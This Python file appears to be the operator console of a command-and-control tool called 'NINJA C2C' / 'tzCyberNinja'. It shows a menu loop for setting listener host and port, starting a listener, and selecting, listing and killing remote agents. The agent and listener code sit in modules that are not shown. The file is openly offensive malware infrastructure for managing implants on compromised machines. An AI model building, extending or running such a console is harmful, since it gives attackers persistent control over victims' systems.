#!/usr/bin/python3
import time
import platform
try:
    import readline
except ImportError:
    import pyreadline as readline
import os
import sys
from time import sleep
import signal

# Custom Helper Commands
import helper
import listener

OPTIONS = {"lhost": "0.0.0.0", "lport": 8080, "iflag": "resource.html"}

def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def ninja_banner(title="NINJA C2C", subtitle="Stealth | Control | Dominate"):
    ninja_ascii = r"""
    \033[1;32m
     ███▄ ▄███▓ ██▓ ███▄    █   ▄████  ███▄    █ ▓█████▄  ▒█████   ██▀███  
    ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒ ██ ▀█   █ ▒██▀ ██▌▒██▒  ██▒▓██ ▒ ██▒
    ▓██    ▓██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░▓██  ▀█ ██▒░██   █▌▒██░  ██▒▓██ ░▄█ ▒
    ▒██    ▒██ ░██░▓██▒  ▐▌██▒░▓█  ██▓▓██▒  ▐▌██▒░▓█▄   ▌▒██   ██░▒██▀▀█▄  
    ▒██▒   ░██▒░██░▒██░   ▓██░░▒▓███▀▒▒██░   ▓██░░▒████▓ ░ ████▓▒░░██▓ ▒██▒
    ░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
    ░  ░      ░ ▒ ░░ ░░   ░ ▒░  ░   ░ ░ ░░   ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░▒ ░ ▒░
    ░      ░    ▒ ░   ░   ░ ░ ░ ░   ░    ░   ░ ░  ░ ░  ░ ░ ░ ░ ▒    ░░   ░ 
           ░    ░           ░       ░          ░    ░        ░ ░     ░     
                                              ░      ░                      
    \033[0m
    """
    
    border = "\033[1;35m" + "═" * 60 + "\033[0m"
    title_line = "\033[1;36m" + f"║{title.center(58)}║" + "\033[0m"
    subtitle_line = "\033[1;33m" + f"║{subtitle.center(58)}║" + "\033[0m"
    author_line = "\033[1;37m" + "║" + "Author: AuxGrep".center(58) + "║" + "\033[0m"
    usage_line = "\033[1;37m" + "║" + "Usage: Use 'help' to see available commands".center(58) + "║" + "\033[0m"
    
    print(ninja_ascii)
    print("\033[1;35m╔" + "═" * 58 + "╗\033[0m")
    print(title_line)
    print(subtitle_line)
    print("\033[1;35m╠" + "═" * 58 + "╣\033[0m")
    print(author_line)
    print(usage_line)
    print("\033[1;35m╚" + "═" * 58 + "╝\033[0m\n")

def colored_prompt():
    lhost = "\033[1;32m" + OPTIONS["lhost"] + "\033[0m"
    lport = "\033[1;33m" + str(OPTIONS["lport"]) + "\033[0m"
    iflag = "\033[1;36m" + OPTIONS["iflag"] + "\033[0m"
    return f"\033[1;31mtzCyberNinja\033[0m [\033[1;34m{lhost}\033[0m:\033[1;34m{lport}\033[0m:\033[1;34m{iflag}\033[0m]$ "

def main():
    clear_screen()
    ninja_banner()
    while True:
        try:
            readline.parse_and_bind("tab: complete")
            readline.set_completer(helper.HelpCommandCompletion)

            OPTIONSELECTED = str(input(colored_prompt())).strip()
            if not OPTIONSELECTED:
                continue

            elif OPTIONSELECTED == "exit":
                print("\033[1;31m[!] Exiting tzCyberNinja...\033[0m")
                break

            elif OPTIONSELECTED == "help":
                helper.Help()

            elif OPTIONSELECTED == "back":
                print("\033[1;33m[!] This command cannot be used in this screen\033[0m")

            elif OPTIONSELECTED == "jobs":
                if not listener.ProcessList:
                    print("\033[1;33m[!] No active jobs\033[0m")
                    continue
                    
                print("\033[1;35mActive Jobs:\033[0m")
                print("\033[1;36m" + "-" * 50 + "\033[0m")
                for counter, (pid, desc) in enumerate(listener.ProcessList.items(), 1):
                    print(f"\033[1;32m{counter}.\033[0m PID: \033[1;33m{pid}\033[0m || \033[1;34m{desc}\033[0m")
                print("\033[1;36m" + "-" * 50 + "\033[0m")

            elif OPTIONSELECTED == "killall":
                try:
                    for x, y in listener.AgentParentChildBucket.items():
                        for u, v in y.items():
                            u.send("exit\n")
                    sleep(1)
                    for x, y in listener.ProcessList.items():
                        print("\033[1;31m[x] Killing " + str(y) + "\033[0m")
                        os.kill(int(x), signal.SIGKILL)
                    listener.ProcessList.clear()
                    print("\033[1;32m[✓] All agents terminated successfully\033[0m")
                except Exception as ex:
                    print("\033[1;31m[x] Unable to kill the Agent: " + str(ex) + "\033[0m")

            elif "kill" in OPTIONSELECTED:
                if len(OPTIONSELECTED.split(" ")) != 2:
                    print("\033[1;31m[x] Kill who? Yourself?\033[0m")
                else:
                    try:
                        for x, y in listener.AgentParentChildBucket.items():
                            if x == (listener.ProcessList[int(OPTIONSELECTED.split(" ")[1])]):
                                for u, v in y.items():
                                    u.send("exit\n")
                        print(f"\033[1;32m[✓] Agent {OPTIONSELECTED.split(' ')[1]} terminated successfully\033[0m")
                    except Exception as ex:
                        print("\033[1;31m[x] Unable to kill Agent: " + str(ex) + "\033[0m")

            elif "select" in OPTIONSELECTED:
                if len(OPTIONSELECTED.split(" ")) != 2:
                    print("\033[1;31m[x] Invalid Agent selected\033[0m")
                else:
                    if OPTIONSELECTED.split(" ")[1] in listener.AgentParentChildBucket.keys():
                        listener.AgentSelector(OPTIONSELECTED.split(" ")[1])
                    else:
                        print("\033[1;31m[x] Unable to access the Agent\033[0m")

            elif OPTIONSELECTED == "run":
                if not OPTIONS["lhost"] or not OPTIONS["lport"]:
                    print("\033[1;31m[x] Cannot start listener! At least one parameter is invalid/empty!\033[0m")
                else:
                    print("\033[1;33m[~] Starting listener...\033[0m")
                    listener.Listener(OPTIONS["lhost"], OPTIONS["lport"], OPTIONS["iflag"])

            elif "lhost" in OPTIONSELECTED:
                if len(OPTIONSELECTED.split(" ")) != 3:
                    print("\033[1;31m[x] Cannot set an empty listener host\033[0m")
                else:
                    try:
                        OPTIONS["lhost"] = OPTIONSELECTED.split(" ")[2]
                        print("\033[1;32m[+] Listener host set as " + OPTIONS["lhost"] + "\033[0m\n")
                    except Exception as ex:
                        print("\033[1;31m[x] Invalid host: " + str(ex) + "\033[0m\n")

            elif "iflag" in OPTIONSELECTED:
                if len(OPTIONSELECTED.split(" ")) != 3:
                    print("\033[1;31m[x] Cannot set an empty flag for verification\033[0m")
                else:
                    try:
                        OPTIONS["iflag"] = OPTIONSELECTED.split(" ")[2]
                        print("\033[1;32m[+] Flag verification set to " + OPTIONS["iflag"] + "\033[0m\n")
                    except Exception as ex:
                        print("\033[1;31m[x] Invalid flag: " + str(ex) + "\033[0m\n")

            elif "lport" in OPTIONSELECTED:
                if len(OPTIONSELECTED.split(" ")) != 3:
                    print("\033[1;31m[x] Cannot set an empty listener port\033[0m")
                else:
                    try:
                        OPTIONS["lport"] = int(OPTIONSELECTED.split(" ")[2])
                        print("\033[1;32m[+] Listener port set as " + str(OPTIONS["lport"]) + "\033[0m\n")
                    except Exception as ex:
                        print("\033[1;31m[x] Invalid port: " + str(ex) + "\033[0m\n")

            elif OPTIONSELECTED.split(" ")[0] not in helper.HelpCommands:
                print("\033[1;31m[x] Invalid option. Type 'help' for available commands.\033[0m\n")
            
        except KeyboardInterrupt:
            print("\n\033[1;33m[!] Use 'exit' command to quit tzCyberNinja!\033[0m\n")
            continue
        except Exception as e:
            print(f"\033[1;31m[!] Error: {str(e)}\033[0m")
            continue

    sys.exit(0)

if __name__ == '__main__':
    main()